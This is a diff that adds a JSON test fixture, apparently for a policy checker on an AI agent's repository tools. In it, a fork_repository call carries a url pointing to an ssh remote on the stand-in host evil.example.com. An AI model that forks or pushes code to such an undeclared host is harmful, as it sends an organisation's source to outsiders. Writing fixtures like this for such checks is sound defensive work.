@@ -1,0 +1,15 @@
+{
+  "note": "An ssh:// remote to an undeclared host.",
+  "rule": {
+    "tool": "fork_repository",
+    "action": "repo.fork",
+    "resources": [
+      "acme/api"
+    ]
+  },
+  "args": {
+    "owner": "acme",
+    "repo": "api",
+    "url": "ssh://git@evil.example.com/acme/api.git"
+  }
+}
